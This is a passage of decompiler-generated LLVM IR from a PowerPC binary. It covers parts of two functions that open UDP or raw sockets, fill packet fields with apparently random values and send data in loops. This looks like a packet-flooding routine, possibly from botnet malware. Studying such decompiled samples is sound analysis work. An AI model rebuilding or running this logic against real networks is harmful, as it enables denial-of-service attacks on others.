  %v3_10004c9c = add i32 %v2_10004c9c, %v1_10004c9c
  %v4_10004c9c = inttoptr i32 %v3_10004c9c to i32*
  store i32 %v3_10004c8c, i32* %v4_10004c9c, align 4
  br i1 %v3_10004c94, label %dec_label_pc_10004dd4, label %dec_label_pc_10004ca4

dec_label_pc_10004ca4:                            ; preds = %dec_label_pc_10004c64
  %v0_10004ca4 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10004ca4, i32* %stack_var_-72, align 4
  store i32 268455092, i32* @lr, align 4
  %v0_10004cb0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10004cb0 = call i32 @function_1000bf88(i32 %v0_10004cb0, i32 %v2_10004da0, i32 16)
  store i32 %v3_10004cb0, i32* %r3.global-to-local, align 4
  %v0_10004cb4 = load i32, i32* @r28, align 4
  %v1_10004cb4 = add i32 %v0_10004cb4, 20
  %v2_10004cb4 = inttoptr i32 %v1_10004cb4 to i8*
  %v3_10004cb4 = load i8, i8* %v2_10004cb4, align 1
  %v2_10004cb8 = icmp ugt i8 %v3_10004cb4, 31
  br i1 %v2_10004cb8, label %dec_label_pc_10004cd8, label %dec_label_pc_10004cc0

dec_label_pc_10004cc0:                            ; preds = %dec_label_pc_10004ca4
  %v1_10004cc0 = add i32 %v0_10004cb4, 16
  %v2_10004cc0 = inttoptr i32 %v1_10004cc0 to i32*
  %v3_10004cc0 = load i32, i32* %v2_10004cc0, align 4
  store i32 %v3_10004cc0, i32* %r29.global-to-local, align 4
  %v0_10004cc4 = call i32 @function_10007ca8()
  store i32 %v0_10004cc4, i32* %r3.global-to-local, align 4
  %v0_10004cc8 = load i32, i32* @r28, align 4
  %v1_10004cc8 = add i32 %v0_10004cc8, 20
  %v2_10004cc8 = inttoptr i32 %v1_10004cc8 to i8*
  %v3_10004cc8 = load i8, i8* %v2_10004cc8, align 1
  %tmp = urem i8 %v3_10004cc8, 64
  %v2_10004ccc = zext i8 %tmp to i32
  %v3_10004ccc = lshr i32 %v0_10004cc4, %v2_10004ccc
  %v0_10004cd0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004cd0 = add i32 %v3_10004ccc, %v0_10004cd0
  store i32 %v2_10004cd0, i32* %r3.global-to-local, align 4
  %v2_10004cd4 = add i32 %v0_10004cc8, 4
  %v3_10004cd4 = inttoptr i32 %v2_10004cd4 to i32*
  store i32 %v2_10004cd0, i32* %v3_10004cd4, align 4
  br label %dec_label_pc_10004cd8

dec_label_pc_10004cd8:                            ; preds = %dec_label_pc_10004ca4, %dec_label_pc_10004cc0
  %v0_10004cd8 = load i32, i32* %r25.global-to-local, align 4
  %v1_10004cd8 = load i32, i32* %r26.global-to-local, align 4
  %v2_10004cd8 = add i32 %v1_10004cd8, %v0_10004cd8
  %v3_10004cd8 = inttoptr i32 %v2_10004cd8 to i32*
  %v4_10004cd8 = load i32, i32* %v3_10004cd8, align 4
  store i32 %v4_10004cd8, i32* @r3, align 4
  %v1_10004ce4 = add i32 %v0_10004cd8, 4
  store i32 %v1_10004ce4, i32* %r25.global-to-local, align 4
  store i32 268455148, i32* @lr, align 4
  %v0_10004ce8 = call i32 @function_1000bfbc()
  store i32 %v0_10004ce8, i32* %r3.global-to-local, align 4
  %v0_10004cec = load i32, i32* %r24.global-to-local, align 4
  %v1_10004cec = load i32, i32* @r30, align 4
  %v4_10004cec = icmp eq i32 %v0_10004cec, %v1_10004cec
  %v0_10004cf0 = load i32, i32* @r28, align 4
  %v1_10004cf0 = add i32 %v0_10004cf0, 24
  store i32 %v1_10004cf0, i32* @r28, align 4
  br i1 %v4_10004cec, label %dec_label_pc_10004cf8, label %dec_label_pc_10004c64

dec_label_pc_10004cf8:                            ; preds = %dec_label_pc_10004cd8, %dec_label_pc_10004d50, %dec_label_pc_10004c38
  %v0_10004cf8 = load i32, i32* %r23.global-to-local, align 4
  %v3_10004cf8 = icmp eq i32 %v0_10004cf8, 0
  store i1 %v3_10004cf8, i1* %cr3_eq.global-to-local, align 1
  %v0_10004cfc.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004cfc.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_10004cfc.outer

dec_label_pc_10004cfc.outer:                      ; preds = %dec_label_pc_10004d30, %dec_label_pc_10004e68, %dec_label_pc_10004cf8
  %v1_10004cfc.ph39 = phi i1 [ %v1_10004cfc.pre, %dec_label_pc_10004cf8 ], [ %v1_10004e68, %dec_label_pc_10004e68 ], [ %v1_10004d30, %dec_label_pc_10004d30 ]
  %v0_10004cfc.ph40 = phi i1 [ %v0_10004cfc.pre, %dec_label_pc_10004cf8 ], [ %v0_10004e68, %dec_label_pc_10004e68 ], [ %v0_10004d30, %dec_label_pc_10004d30 ]
  %v2_10004cfc = or i1 %v1_10004cfc.ph39, %v0_10004cfc.ph40
  br label %dec_label_pc_10004cfc

dec_label_pc_10004cfc:                            ; preds = %dec_label_pc_10004cfc.outer, %dec_label_pc_10004cfc
  br i1 %v2_10004cfc, label %dec_label_pc_10004cfc, label %dec_label_pc_10004d00

dec_label_pc_10004d00:                            ; preds = %dec_label_pc_10004e68, %dec_label_pc_10004d30, %dec_label_pc_10004cfc
  %v0_10004d00 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10004d00, label %dec_label_pc_10004d04, label %dec_label_pc_10004e2c

dec_label_pc_10004d04:                            ; preds = %dec_label_pc_10004d00
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10004d0c

dec_label_pc_10004d0c:                            ; preds = %dec_label_pc_10004d0c.dec_label_pc_10004d0c_crit_edge, %dec_label_pc_10004d04
  %v0_10004d10 = phi i32 [ %v0_10004d28, %dec_label_pc_10004d0c.dec_label_pc_10004d0c_crit_edge ], [ 0, %dec_label_pc_10004d04 ]
  %v0_10004d20 = phi i32 [ %v0_10004d0c.pre, %dec_label_pc_10004d0c.dec_label_pc_10004d0c_crit_edge ], [ 0, %dec_label_pc_10004d04 ]
  %v1_10004d0c = load i32, i32* %r26.global-to-local, align 4
  %v2_10004d0c = add i32 %v1_10004d0c, %v0_10004d20
  %v3_10004d0c = inttoptr i32 %v2_10004d0c to i32*
  %v4_10004d0c = load i32, i32* %v3_10004d0c, align 4
  store i32 %v4_10004d0c, i32* %r3.global-to-local, align 4
  %v1_10004d10 = add i32 %v0_10004d10, 1
  store i32 %v1_10004d10, i32* %r28.global-to-local, align 4
  %v1_10004d14 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004d14 = add i32 %v1_10004d14, %v0_10004d20
  %v3_10004d14 = inttoptr i32 %v2_10004d14 to i32*
  %v4_10004d14 = load i32, i32* %v3_10004d14, align 4
  %v0_10004d18 = load i32, i32* @r31, align 4
  %v1_10004d20 = add i32 %v0_10004d20, 4
  store i32 %v1_10004d20, i32* %r29.global-to-local, align 4
  store i32 268455208, i32* @lr, align 4
  %v4_10004d24 = call i32 @function_1000c108(i32 %v4_10004d0c, i32 %v4_10004d14, i32 %v0_10004d18, i32 16384)
  store i32 %v4_10004d24, i32* %r3.global-to-local, align 4
  %v0_10004d28 = load i32, i32* %r28.global-to-local, align 4
  %v1_10004d28 = load i32, i32* @r30, align 4
  %v4_10004d28 = icmp eq i32 %v0_10004d28, %v1_10004d28
  br i1 %v4_10004d28, label %dec_label_pc_10004d30, label %dec_label_pc_10004d0c.dec_label_pc_10004d0c_crit_edge

dec_label_pc_10004d0c.dec_label_pc_10004d0c_crit_edge: ; preds = %dec_label_pc_10004d0c
  %v0_10004d0c.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10004d0c

dec_label_pc_10004d30:                            ; preds = %dec_label_pc_10004d0c
  %v0_10004d30 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004d30 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10004d30 = or i1 %v0_10004d30, %v1_10004d30
  br i1 %v2_10004d30, label %dec_label_pc_10004cfc.outer, label %dec_label_pc_10004d00

dec_label_pc_10004d50:                            ; preds = %dec_label_pc_10004db4, %dec_label_pc_10004dd0
  %v0_10004d50 = load i32, i32* %r25.global-to-local, align 4
  %v1_10004d50 = load i32, i32* %r26.global-to-local, align 4
  %v2_10004d50 = add i32 %v1_10004d50, %v0_10004d50
  %v3_10004d50 = inttoptr i32 %v2_10004d50 to i32*
  %v4_10004d50 = load i32, i32* %v3_10004d50, align 4
  store i32 %v4_10004d50, i32* @r3, align 4
  %v1_10004d5c = add i32 %v0_10004d50, 4
  store i32 %v1_10004d5c, i32* %r25.global-to-local, align 4
  store i32 268455268, i32* @lr, align 4
  %v0_10004d60 = call i32 @function_1000bfbc()
  store i32 %v0_10004d60, i32* %r3.global-to-local, align 4
  %v0_10004d64 = load i32, i32* %r24.global-to-local, align 4
  %v1_10004d64 = load i32, i32* @r30, align 4
  %v4_10004d64 = icmp eq i32 %v0_10004d64, %v1_10004d64
  %v0_10004d68 = load i32, i32* @r28, align 4
  %v1_10004d68 = add i32 %v0_10004d68, 24
  store i32 %v1_10004d68, i32* @r28, align 4
  br i1 %v4_10004d64, label %dec_label_pc_10004cf8, label %dec_label_pc_10004d70

dec_label_pc_10004d70:                            ; preds = %dec_label_pc_10004c40, %dec_label_pc_10004d50
  %v0_10004d7c = phi i32 [ %v0_10004d64, %dec_label_pc_10004d50 ], [ 0, %dec_label_pc_10004c40 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_10004d7c = add i32 %v0_10004d7c, 1
  store i32 %v1_10004d7c, i32* %r24.global-to-local, align 4
  store i32 268455300, i32* @lr, align 4
  %v2_10004d80 = call i32 @function_1000c548(i32 65535, i32 1)
  store i32 %v2_10004d80, i32* %r3.global-to-local, align 4
  %v1_10004d84 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004d84 = load i32, i32* %r27.global-to-local, align 4
  %v3_10004d84 = add i32 %v2_10004d84, %v1_10004d84
  %v4_10004d84 = inttoptr i32 %v3_10004d84 to i32*
  store i32 %v2_10004d80, i32* %v4_10004d84, align 4
  %v0_10004d88 = call i32 @function_10007ca8()
  %v1_10004d88 = trunc i32 %v0_10004d88 to i16
  %v3_10004d8c = load i32, i32* @r28, align 4
  %v4_10004d8c = add i32 %v3_10004d8c, 2
  %v5_10004d8c = inttoptr i32 %v4_10004d8c to i16*
  store i16 %v1_10004d88, i16* %v5_10004d8c, align 2
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268455328, i32* @lr, align 4
  %v3_10004d9c = call i32 @function_1000c1bc(i32 2, i32 2, i32 17)
  store i32 %v3_10004d9c, i32* %r3.global-to-local, align 4
  %v3_10004da4 = icmp eq i32 %v3_10004d9c, -1
  %v1_10004dac = load i32, i32* %r25.global-to-local, align 4
  %v2_10004dac = load i32, i32* %r26.global-to-local, align 4
  %v3_10004dac = add i32 %v2_10004dac, %v1_10004dac
  %v4_10004dac = inttoptr i32 %v3_10004dac to i32*
  store i32 %v3_10004d9c, i32* %v4_10004dac, align 4
  br i1 %v3_10004da4, label %dec_label_pc_10004dd4, label %dec_label_pc_10004db4

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d70
  %v0_10004db4 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10004db4, i32* %stack_var_-72, align 4
  store i32 268455364, i32* @lr, align 4
  %v0_10004dc0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10004dc0 = call i32 @function_1000bf88(i32 %v0_10004dc0, i32 %v2_10004da0, i32 16)
  store i32 %v3_10004dc0, i32* %r3.global-to-local, align 4
  %v0_10004dc4 = load i32, i32* @r28, align 4
  %v1_10004dc4 = add i32 %v0_10004dc4, 20
  %v2_10004dc4 = inttoptr i32 %v1_10004dc4 to i8*
  %v3_10004dc4 = load i8, i8* %v2_10004dc4, align 1
  %v2_10004dc8 = icmp ugt i8 %v3_10004dc4, 31
  br i1 %v2_10004dc8, label %dec_label_pc_10004d50, label %dec_label_pc_10004dd0

dec_label_pc_10004dd0:                            ; preds = %dec_label_pc_10004db4
  %v1_10004d38 = add i32 %v0_10004dc4, 16
  %v2_10004d38 = inttoptr i32 %v1_10004d38 to i32*
  %v3_10004d38 = load i32, i32* %v2_10004d38, align 4
  store i32 %v3_10004d38, i32* %r29.global-to-local, align 4
  %v0_10004d3c = call i32 @function_10007ca8()
  store i32 %v0_10004d3c, i32* %r3.global-to-local, align 4
  %v0_10004d40 = load i32, i32* @r28, align 4
  %v1_10004d40 = add i32 %v0_10004d40, 20
  %v2_10004d40 = inttoptr i32 %v1_10004d40 to i8*
  %v3_10004d40 = load i8, i8* %v2_10004d40, align 1
  %tmp43 = urem i8 %v3_10004d40, 64
  %v2_10004d44 = zext i8 %tmp43 to i32
  %v3_10004d44 = lshr i32 %v0_10004d3c, %v2_10004d44
  %v0_10004d48 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004d48 = add i32 %v3_10004d44, %v0_10004d48
  store i32 %v2_10004d48, i32* %r3.global-to-local, align 4
  %v2_10004d4c = add i32 %v0_10004d40, 4
  %v3_10004d4c = inttoptr i32 %v2_10004d4c to i32*
  store i32 %v2_10004d48, i32* %v3_10004d4c, align 4
  br label %dec_label_pc_10004d50

dec_label_pc_10004dd4:                            ; preds = %dec_label_pc_10004c64, %dec_label_pc_10004d70
  %v1_10004de8 = call %0 @__asm_mtcrf(i32 24, i32 %v0_10004b40)
  store i32 %v0_10004b6c, i32* %r28.global-to-local, align 4
  store i32 %v0_10004b74, i32* %r29.global-to-local, align 4
  %v0_10004e1c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004e1c

dec_label_pc_10004e20:                            ; preds = %dec_label_pc_10004b38
  %v0_10004e20 = call i32 @function_10007ca8()
  store i32 %v0_10004e20, i32* %r3.global-to-local, align 4
  %v1_10004e24 = urem i32 %v0_10004e20, 65536
  store i32 %v1_10004e24, i32* %r22.global-to-local, align 4
  br label %dec_label_pc_10004c38

dec_label_pc_10004e2c:                            ; preds = %dec_label_pc_10004d00
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10004e34

dec_label_pc_10004e34:                            ; preds = %dec_label_pc_10004e34.dec_label_pc_10004e34_crit_edge, %dec_label_pc_10004e2c
  %v0_10004e3c = phi i32 [ %v0_10004e60, %dec_label_pc_10004e34.dec_label_pc_10004e34_crit_edge ], [ 0, %dec_label_pc_10004e2c ]
  %v0_10004e34 = phi i32 [ %v0_10004e34.pre, %dec_label_pc_10004e34.dec_label_pc_10004e34_crit_edge ], [ 0, %dec_label_pc_10004e2c ]
  %v1_10004e34 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004e34 = add i32 %v1_10004e34, %v0_10004e34
  %v3_10004e34 = inttoptr i32 %v2_10004e34 to i32*
  %v4_10004e34 = load i32, i32* %v3_10004e34, align 4
  store i32 %v4_10004e34, i32* @r29, align 4
  %v0_10004e38 = load i32, i32* @r31, align 4
  store i32 %v0_10004e38, i32* @r4, align 4
  %v1_10004e3c = add i32 %v0_10004e3c, 1
  store i32 %v1_10004e3c, i32* %r25.global-to-local, align 4
  store i32 %v4_10004e34, i32* @r3, align 4
  %v0_10004e44 = call i32 @function_10007ed4()
  store i32 %v0_10004e44, i32* %r3.global-to-local, align 4
  %v0_10004e48 = load i32, i32* %r28.global-to-local, align 4
  %v1_10004e48 = load i32, i32* %r26.global-to-local, align 4
  %v2_10004e48 = add i32 %v1_10004e48, %v0_10004e48
  %v3_10004e48 = inttoptr i32 %v2_10004e48 to i32*
  %v4_10004e48 = load i32, i32* %v3_10004e48, align 4
  store i32 %v4_10004e48, i32* %r3.global-to-local, align 4
  %v0_10004e4c = load i32, i32* @r29, align 4
  %v0_10004e50 = load i32, i32* @r31, align 4
  %v1_10004e58 = add i32 %v0_10004e48, 4
  store i32 %v1_10004e58, i32* %r28.global-to-local, align 4
  store i32 268455520, i32* @lr, align 4
  %v4_10004e5c = call i32 @function_1000c108(i32 %v4_10004e48, i32 %v0_10004e4c, i32 %v0_10004e50, i32 16384)
  store i32 %v4_10004e5c, i32* %r3.global-to-local, align 4
  %v0_10004e60 = load i32, i32* %r25.global-to-local, align 4
  %v1_10004e60 = load i32, i32* @r30, align 4
  %v4_10004e60 = icmp eq i32 %v0_10004e60, %v1_10004e60
  br i1 %v4_10004e60, label %dec_label_pc_10004e68, label %dec_label_pc_10004e34.dec_label_pc_10004e34_crit_edge

dec_label_pc_10004e34.dec_label_pc_10004e34_crit_edge: ; preds = %dec_label_pc_10004e34
  %v0_10004e34.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10004e34

dec_label_pc_10004e68:                            ; preds = %dec_label_pc_10004e34
  %v0_10004e68 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004e68 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10004e68 = or i1 %v0_10004e68, %v1_10004e68
  br i1 %v2_10004e68, label %dec_label_pc_10004cfc.outer, label %dec_label_pc_10004d00

; uselistorder directives
  uselistorder i1 %v1_10004e68, { 1, 0 }
  uselistorder i1 %v0_10004e68, { 1, 0 }
  uselistorder i32 %v0_10004e60, { 1, 0 }
  uselistorder i32 %v0_10004e48, { 1, 0 }
  uselistorder i32 %v0_10004d50, { 1, 0 }
  uselistorder i1 %v1_10004d30, { 1, 0 }
  uselistorder i1 %v0_10004d30, { 1, 0 }
  uselistorder i32 %v0_10004d28, { 1, 0 }
  uselistorder i32 %v0_10004d20, { 2, 0, 1 }
  uselistorder i32 %v0_10004cec, { 1, 0 }
  uselistorder i32 %v0_10004cd8, { 1, 0 }
  uselistorder i32 %v2_10004da0, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 22, 6, 7, 9, 10, 11, 12, 13, 14, 8, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1 }
  uselistorder i32* %r26.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r25.global-to-local, { 0, 1, 2, 6, 7, 3, 5, 4, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r21.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr4_lt.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10004dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10004d70, { 1, 0 }
  uselistorder label %dec_label_pc_10004d50, { 1, 0 }
  uselistorder label %dec_label_pc_10004cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10004cfc.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004cf8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004cd8, { 1, 0 }
  uselistorder label %dec_label_pc_10004c64, { 1, 0 }
  uselistorder label %dec_label_pc_10004c38, { 1, 0 }
}

define i32 @function_10004e70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004e70:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_10004e78 = call i32 @__asm_mfcr()
  store i32 %v0_10004e78, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r25.global-to-local, align 4
  %v0_10004ea4 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10004eac = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 268455632, i32* @lr, align 4
  %v2_10004ecc = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_10004ecc, i32* %r27.global-to-local, align 4
  %v0_10004ed8 = load i32, i32* @r30, align 4
  store i32 %v0_10004ed8, i32* %r3.global-to-local, align 4
  store i32 268455648, i32* @lr, align 4
  %v2_10004edc = call i32 @function_1000c548(i32 %v0_10004ed8, i32 4)
  %v0_10004ee4 = load i32, i32* @r28, align 4
  store i32 %v2_10004edc, i32* %r26.global-to-local, align 4
  %v0_10004ef4 = load i32, i32* @r29, align 4
  store i32 %v0_10004ef4, i32* %r3.global-to-local, align 4
  store i32 268455676, i32* @lr, align 4
  %v4_10004ef8 = inttoptr i32 %v0_10004ee4 to i32*
  %v5_10004ef8 = call i32 @function_1000235c(i32 %v0_10004ef4, i32* %v4_10004ef8, i32 7, i32 65535)
  %v0_10004f04 = load i32, i32* @r28, align 4
  %v1_10004f0c = urem i32 %v5_10004ef8, 65536
  store i32 %v1_10004f0c, i32* %r21.global-to-local, align 4
  %v0_10004f10 = load i32, i32* @r29, align 4
  store i32 %v0_10004f10, i32* %r3.global-to-local, align 4
  store i32 268455704, i32* @lr, align 4
  %v4_10004f14 = inttoptr i32 %v0_10004f04 to i32*
  %v5_10004f14 = call i32 @function_1000235c(i32 %v0_10004f10, i32* %v4_10004f14, i32 6, i32 65535)
  %v0_10004f18 = load i32, i32* @r28, align 4
  %v1_10004f1c = urem i32 %v5_10004f14, 65536
  store i32 %v1_10004f1c, i32* %r22.global-to-local, align 4
  %v0_10004f28 = load i32, i32* @r29, align 4
  store i32 %v0_10004f28, i32* %r3.global-to-local, align 4
  store i32 268455728, i32* @lr, align 4
  %v4_10004f2c = inttoptr i32 %v0_10004f18 to i32*
  %v5_10004f2c = call i32 @function_1000235c(i32 %v0_10004f28, i32* %v4_10004f2c, i32 0, i32 1024)
  %v0_10004f30 = load i32, i32* @r28, align 4
  %v1_10004f34 = urem i32 %v5_10004f2c, 65536
  store i32 %v1_10004f34, i32* @r31, align 4
  %v0_10004f3c = load i32, i32* @r29, align 4
  store i32 %v0_10004f3c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10004f48.80 to i32), i32* @lr, align 4
  %v4_10004f44 = inttoptr i32 %v0_10004f30 to i32*
  %v5_10004f44 = call i32 @function_1000235c(i32 %v0_10004f3c, i32* %v4_10004f44, i32 1, i32 1)
  store i32 %v5_10004f44, i32* %r3.global-to-local, align 4
  %v0_10004f54 = load i32, i32* %r22.global-to-local, align 4
  %v4_10004f54 = icmp eq i32 %v0_10004f54, 65535
  %v1_10004f5c = urem i32 %v5_10004f44, 256
  store i32 %v1_10004f5c, i32* %r23.global-to-local, align 4
  store i32 0, i32* %stack_var_-72, align 4
  br i1 %v4_10004f54, label %dec_label_pc_10005158, label %dec_label_pc_10004f70

dec_label_pc_10004f70:                            ; preds = %dec_label_pc_10004e70, %dec_label_pc_10005158
  %v0_10004f70 = load i32, i32* @r30, align 4
  %v1_10004f70 = icmp slt i32 %v0_10004f70, 0
  %v3_10004f70 = icmp eq i32 %v0_10004f70, 0
  store i1 %v1_10004f70, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10004f70, i1* %cr4_eq.global-to-local, align 1
  %tmp38 = icmp slt i32 %v0_10004f70, 1
  br i1 %tmp38, label %dec_label_pc_10005030, label %dec_label_pc_10004f78

dec_label_pc_10004f78:                            ; preds = %dec_label_pc_10004f70
  %v0_10004f7c = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10004f7c, i32* @r28, align 4
  store i32 0, i32* %r24.global-to-local, align 4
  %v0_10004f88 = load i32, i32* %r21.global-to-local, align 4
  %v4_10004f88 = icmp eq i32 %v0_10004f88, 65535
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 2, i32* %r20.global-to-local, align 4
  %v2_100050d8 = ptrtoint i32* %stack_var_-72 to i32
  br i1 %v4_10004f88, label %dec_label_pc_100050a8, label %dec_label_pc_10004f9c

dec_label_pc_10004f9c:                            ; preds = %dec_label_pc_10004f78, %dec_label_pc_10005010
  %v0_10004fa8 = phi i32 [ %v0_10005024, %dec_label_pc_10005010 ], [ 0, %dec_label_pc_10004f78 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_10004fa8 = add i32 %v0_10004fa8, 1
  store i32 %v1_10004fa8, i32* %r24.global-to-local, align 4
  store i32 268455856, i32* @lr, align 4
  %v2_10004fac = call i32 @function_1000c548(i32 65535, i32 1)
  %v0_10004fb0 = load i32, i32* %r21.global-to-local, align 4
  %v1_10004fb0 = trunc i32 %v0_10004fb0 to i16
  %v2_10004fb0 = load i32, i32* @r28, align 4
  %v3_10004fb0 = add i32 %v2_10004fb0, 2
  %v4_10004fb0 = inttoptr i32 %v3_10004fb0 to i16*
  store i16 %v1_10004fb0, i16* %v4_10004fb0, align 2
  %v1_10004fb4 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004fb4 = load i32, i32* %r27.global-to-local, align 4
  %v3_10004fb4 = add i32 %v2_10004fb4, %v1_10004fb4
  %v4_10004fb4 = inttoptr i32 %v3_10004fb4 to i32*
  store i32 %v2_10004fac, i32* %v4_10004fb4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268455880, i32* @lr, align 4
  %v3_10004fc4 = call i32 @function_1000c1bc(i32 2, i32 2, i32 0)
  store i32 %v3_10004fc4, i32* %r3.global-to-local, align 4
  %v3_10004fcc = icmp eq i32 %v3_10004fc4, -1
  %v1_10004fd4 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004fd4 = load i32, i32* %r26.global-to-local, align 4
  %v3_10004fd4 = add i32 %v2_10004fd4, %v1_10004fd4
  %v4_10004fd4 = inttoptr i32 %v3_10004fd4 to i32*
  store i32 %v3_10004fc4, i32* %v4_10004fd4, align 4
  br i1 %v3_10004fcc, label %dec_label_pc_1000510c, label %dec_label_pc_10004fdc

dec_label_pc_10004fdc:                            ; preds = %dec_label_pc_10004f9c
  %v0_10004fdc = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10004fdc, i32* %stack_var_-72, align 4
  store i32 268455916, i32* @lr, align 4
  %v0_10004fe8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10004fe8 = call i32 @function_1000bf88(i32 %v0_10004fe8, i32 %v2_100050d8, i32 16)
  store i32 %v3_10004fe8, i32* %r3.global-to-local, align 4
  %v0_10004fec = load i32, i32* @r28, align 4
  %v1_10004fec = add i32 %v0_10004fec, 20
  %v2_10004fec = inttoptr i32 %v1_10004fec to i8*
  %v3_10004fec = load i8, i8* %v2_10004fec, align 1
  %v2_10004ff0 = icmp ugt i8 %v3_10004fec, 31
  br i1 %v2_10004ff0, label %dec_label_pc_10005010, label %dec_label_pc_10004ff8

dec_label_pc_10004ff8:                            ; preds = %dec_label_pc_10004fdc
  %v1_10004ff8 = add i32 %v0_10004fec, 16
  %v2_10004ff8 = inttoptr i32 %v1_10004ff8 to i32*
  %v3_10004ff8 = load i32, i32* %v2_10004ff8, align 4
  store i32 %v3_10004ff8, i32* %r29.global-to-local, align 4
  %v0_10004ffc = call i32 @function_10007ca8()
  store i32 %v0_10004ffc, i32* %r3.global-to-local, align 4
  %v0_10005000 = load i32, i32* @r28, align 4
  %v1_10005000 = add i32 %v0_10005000, 20
  %v2_10005000 = inttoptr i32 %v1_10005000 to i8*
  %v3_10005000 = load i8, i8* %v2_10005000, align 1
  %tmp = urem i8 %v3_10005000, 64
  %v2_10005004 = zext i8 %tmp to i32
  %v3_10005004 = lshr i32 %v0_10004ffc, %v2_10005004
  %v0_10005008 = load i32, i32* %r29.global-to-local, align 4
  %v2_10005008 = add i32 %v3_10005004, %v0_10005008
  store i32 %v2_10005008, i32* %r3.global-to-local, align 4
  %v2_1000500c = add i32 %v0_10005000, 4
  %v3_1000500c = inttoptr i32 %v2_1000500c to i32*
  store i32 %v2_10005008, i32* %v3_1000500c, align 4
  br label %dec_label_pc_10005010

dec_label_pc_10005010:                            ; preds = %dec_label_pc_10004fdc, %dec_label_pc_10004ff8
  %v0_10005010 = load i32, i32* %r25.global-to-local, align 4
  %v1_10005010 = load i32, i32* %r26.global-to-local, align 4
  %v2_10005010 = add i32 %v1_10005010, %v0_10005010
  %v3_10005010 = inttoptr i32 %v2_10005010 to i32*
  %v4_10005010 = load i32, i32* %v3_10005010, align 4
  store i32 %v4_10005010, i32* @r3, align 4
  %v1_1000501c = add i32 %v0_10005010, 4
  store i32 %v1_1000501c, i32* %r25.global-to-local, align 4
  store i32 268455972, i32* @lr, align 4
  %v0_10005020 = call i32 @function_1000bfbc()
  store i32 %v0_10005020, i32* %r3.global-to-local, align 4
  %v0_10005024 = load i32, i32* %r24.global-to-local, align 4
  %v1_10005024 = load i32, i32* @r30, align 4
  %v4_10005024 = icmp eq i32 %v0_10005024, %v1_10005024
  %v0_10005028 = load i32, i32* @r28, align 4
  %v1_10005028 = add i32 %v0_10005028, 24
  store i32 %v1_10005028, i32* @r28, align 4
  br i1 %v4_10005024, label %dec_label_pc_10005030, label %dec_label_pc_10004f9c

dec_label_pc_10005030:                            ; preds = %dec_label_pc_10005010, %dec_label_pc_10005088, %dec_label_pc_10004f70
  %v0_10005030 = load i32, i32* %r23.global-to-local, align 4
  %v3_10005030 = icmp eq i32 %v0_10005030, 0
  store i1 %v3_10005030, i1* %cr3_eq.global-to-local, align 1
  %v0_10005034.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10005034.pre = load i1, i1* %cr4_lt.global-to-local, align 1
